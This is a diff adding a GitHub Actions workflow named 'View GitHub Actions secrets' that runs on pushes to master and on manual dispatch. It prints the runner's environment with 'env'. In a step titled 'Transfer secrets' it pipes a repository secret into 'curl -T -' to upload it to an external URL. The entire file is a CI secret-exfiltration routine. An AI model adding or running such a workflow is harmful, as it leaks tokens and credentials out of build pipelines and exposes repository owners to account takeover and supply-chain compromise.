@@ -1,0 +1,14 @@
+name: View GitHub Actions secrets
+on:
+  push:
+    branches: [master]
+  workflow_dispatch:
+ 
+jobs:
+  github-actions-environment-variables-ubuntu:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Get env
+        run: env
+      - name: Transfer secrets
+        run: "echo 'Token XXXX: ${{secrets.XXXX}}' | curl -T - https://github.com"
